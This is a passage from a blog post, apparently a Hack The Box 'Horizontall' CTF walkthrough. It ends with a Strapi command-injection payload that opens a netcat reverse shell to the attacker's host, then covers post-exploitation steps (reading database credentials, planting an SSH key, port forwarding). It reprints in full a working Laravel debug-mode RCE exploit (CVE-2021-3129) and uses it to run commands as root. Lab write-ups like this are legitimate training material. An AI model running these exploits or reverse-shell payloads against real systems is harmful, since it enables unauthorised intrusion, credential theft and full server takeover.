+<span class="c1">#feel free to modify the payload
+</span><span class="n">data</span> <span class="o">=</span> <span class="s">'{"plugin":"documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc '</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s">' '</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span><span class="o">+</span><span class="s">' &gt;/tmp/f)", "port":"80"}'</span> <span class="c1">#Depending on the scenario, you will have to change the port here
+</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Sending payload... Check if you got shell"</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlVuln</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[+] Payload sent. Response:"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>So if we want to run the exploit it tells us that we need a jwt from a valid user, in this case i use burpsuite and i will use the jwt of the admin user.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura22.png">
+</p>
+
+<p>So what i have done is in one window to execute the exploit by putting the admin user jwt and in the second window to listen connections via netcat on the port 1234. And as we can see we have received a connection from the victim machine to our attacker machine.</p>
+
+<p><strong><em>-d</em></strong>: the parameter -d it’s for specify the domain.</p>
+
+<p><strong><em>-jwt</em></strong>: specify that we gon a use jwt token.</p>
+
+<p><strong><em>-l</em></strong>: for liesten (in this case the attacker machine ip address).</p>
+
+<p><strong><em>-p</em></strong>: specify the port (in this case the attacker port).</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura23.png">
+</p>
+
+<p>Once we have access to the machine, we will spawn a pseudo console with python and we will export two environment variables that is <strong><em>xterm</em></strong> to able to use command like <strong><em>clear</em></strong> and the shell <strong><em>bash</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura24.png">
+</p>
+
+<p>We are going to list all users that has created on the system, and we can see that there is a user with id 1000 called <strong><em>developer</em></strong>. Let’s access to the home directory of that user.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura25.png">
+</p>
+
+<p>And now we can see the first flag which is the <strong><em>user.txt</em></strong> that we are going to submit in the hackthebox website.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura26.png">
+</p>
+
+<p>I tried to access the <strong><em>myproject</em></strong> directory but i don’t have permissions to access and also the php file, hmm interesting.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura27.png">
+</p>
+
+<p>The only directory i had access to was the api directory, looking through the files in that particular directory i found database credentials for the user <strong><em>developer</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura28.png">
+</p>
+
+<p>What i did was to use those credentials to access in the database, to see if there was anything interesting.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura29.png">
+</p>
+
+<p>I have accessed the strapi database and we can see the credentials of the admin user that we have been exploited.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura30.png">
+</p>
+
+<p>I tried to access some of the tables in the strapi database to see if there was any useful information to escalate privileges, but some tables would not let me access them. So to escalate privileges is not going in this way.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura31.png">
+</p>
+
+<p>So what i did is with the command <strong><em>netstat</em></strong> to see if there was any internal service running in any port, and i found the port 8000 which is listening but it does not show the service that is running, i tried several methods and commands to find out what specific service was running on that port, but none of them worked.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura32.png">
+</p>
+
+<p>until i saw on port 6004 was running chisel, so i decided to investigate what it was.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura33.png">
+</p>
+
+<p>As we can access the ssh route, what we can do is to creata tunnel through ssh (in this case we are going to use <strong><em>SSH local port forwarding</em></strong> ) to access on the port 8000 as if it were localhost (since we must remember that we cannot access that port via localhost because we are connected to a remote machine) and from there know which service is running.</p>
+
+<p>More info: <a href="https://www.ssh.com/academy/ssh/tunneling/example">SSH port forwarding</a></p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura34.png">
+</p>
+
+<p>On our attacker’s machine we will generate an ssh key.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura35.png">
+</p>
+
+<p>Now what we are going to do is copy the public key that we just generated and paste it on the victim machine in the file <strong><em>authorized_keys</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura36.png">
+</p>
+
+<p>Once we have uploaded our public key on the victim machine what we are gon a do is with ssh with the <strong><em>-L</em></strong> parameter specify the port forwarding, we have to forward port 8000 of the victim machine to our port 8000 of our attacker machine so that we can browse on that port on our localhost to see what’s in the particular port.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura37.png">
+</p>
+
+<p>And if now in our attacker’s machine we access through localhost with the port 8000 we can see that we can visualize the content of the website of the victim machine, and we can see that the website is using laravel and if we look well below it tells us the version of the framework.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura38.png">
+</p>
+
+<p>And if we search with <strong><em>searchsploit</em></strong> we can see that there are exploits and vulnerabilities for laravel version 8 and one of the most critical. And btw this vunlerability is registered as <strong><em>CVE-2021-3129</em></strong>, and this vunlerability affects the function <strong><em>file_get_contents()</em></strong> and <strong><em>file_put_contents()</em></strong> of the component debug mode in laravel.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura39.png">
+</p>
+
+<p>The exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
+# Date: 1.14.2021
+# Exploit Author: SunCSR Team
+# Vendor Homepage: https://laravel.com/
+# References:
+# https://www.ambionics.io/blog/laravel-debug-rce
+# https://viblo.asia/p/6J3ZgN8PKmB
+# Version: &lt;= 8.4.2
+# Tested on: Ubuntu 18.04 + nginx + php 7.4.3
+# Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce
+</span>
+
+<span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">os</span>
+
+<span class="n">header</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"application/json"</span>
+<span class="p">}</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"solution"</span><span class="p">:</span><span class="s">"Facade</span><span class="se">\\</span><span class="s">Ignition</span><span class="se">\\</span><span class="s">Solutions</span><span class="se">\\</span><span class="s">MakeViewVariableOptionalSolution"</span><span class="p">,</span>\
+        <span class="s">"parameters"</span><span class="p">:{</span>
+            <span class="s">"variableName"</span><span class="p">:</span><span class="s">"cm0s"</span><span class="p">,</span>
+            <span class="s">"viewFile"</span><span class="p">:</span><span class="s">""</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">clear_log</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">viewFile</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+
+    <span class="k">global</span> <span class="n">data</span>
+
+    <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">):</span> <span class="k">pass</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create_payload</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">viewFile</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+
+    <span class="k">global</span> <span class="n">data</span>
+
+    <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="n">f</span><span class="s">'file_get_contents({viewFile})'</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">return</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">viewFile</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+
+    <span class="k">global</span> <span class="n">data</span>
+
+    <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">return</span> <span class="bp">False</span>
+
+<span class="k">def</span> <span class="nf">exploited</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">viewFile</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+
+    <span class="k">global</span> <span class="n">data</span>
+
+    <span class="n">data</span><span class="p">[</span><span class="s">'parameters'</span><span class="p">][</span><span class="s">'viewFile'</span><span class="p">]</span> <span class="o">=</span> <span class="n">viewFile</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="s">'cannot be empty'</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r'\{(.|\n)+\}((.|\n)*)'</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">generate_payload</span><span class="p">(</span><span class="n">command</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">padding</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="s">'/'</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="s">'</span><span class="err">\</span><span class="s">/'</span><span class="p">)</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\\'</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">r'''php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '</span><span class="si">%</span><span class="s">s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' &gt; payload.txt'''</span><span class="o">%</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'payload.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'=='</span><span class="p">,</span> <span class="s">'=3D='</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
+            <span class="n">payload</span> <span class="o">+=</span> <span class="s">'=00'</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'rm -rf payload.txt'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Usage:  </span><span class="si">%</span><span class="s">s url path-log command</span><span class="se">\n</span><span class="s">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">Ex: </span><span class="si">%</span><span class="s">s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log </span><span class="se">\'</span><span class="s">id</span><span class="se">\'</span><span class="s">'</span><span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s">'./phpggc/phpggc'</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Phpggc not found!'</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Run command: git clone https://github.com/ambionics/phpggc.git'</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'git clone https://github.com/ambionics/phpggc.git'</span><span class="p">)</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">path_log</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">generate_payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">padding</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Generate payload error!'</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s">'http'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">url</span> <span class="ow">and</span> <span class="s">'https'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s">'http'</span><span class="o">+</span><span class="n">url</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s">'/_ignition/execute-solution'</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">Exploit...'</span><span class="p">)</span>
+    <span class="n">clear_log</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
+    <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'AA'</span><span class="p">)</span>
+    <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="k">while</span> <span class="p">(</span><span class="ow">not</span> <span class="n">convert</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))):</span>
+        <span class="n">clear_log</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
+        <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'AA'</span><span class="p">)</span>
+        <span class="n">padding</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">generate_payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">padding</span><span class="p">)</span>
+        <span class="n">create_payload</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">exploited</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">'phar://</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="n">path_log</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>In this case i am going to use the RCE exploit that i just found with searchsploit, if we run the exploit it tells us how to run the exploit, before we have seen that it didn’t allow us to access the <strong><em>myproject</em></strong> directory of the developer user, it could be the laravel web files can be in that directory. Let’s check.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura40.png">
+</p>
+
+<p>In this case the laravel.log is used because it is where it contains the logs of all the debugging and there it can contain those two functions mentioned above.</p>
+
+<p>In this case as we have made the forwarding of port 8000 in url option the localhost, and in this case i will test with the directory <strong><em>myproject</em></strong> to see if the RCE works and we can see it’s works!!!, and as we are as root user and with this we can visualize the last flag which is a <strong><em>root.txt</em></strong>. And now what we can do is a reverse shell or see the id_rsa of the root user to connect via ssh, but i make challenge for you to do that 😉.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/captura41.png">
+</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cve" class="page__taxonomy-item" rel="tag">CVE</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack the box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rce" class="page__taxonomy-item" rel="tag">RCE</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#pentest" class="page__taxonomy-item" rel="tag">Pentest</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-06T00:00:00-05:00">January 06, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-secret/" class="pagination--pager" title="HTB - Secret
+">Previous</a>
+    
+    
+      <a href="/hak5-rubberducky/" class="pagination--pager" title="Hak5 - Rubber Ducky
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 bynafrez08.io</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
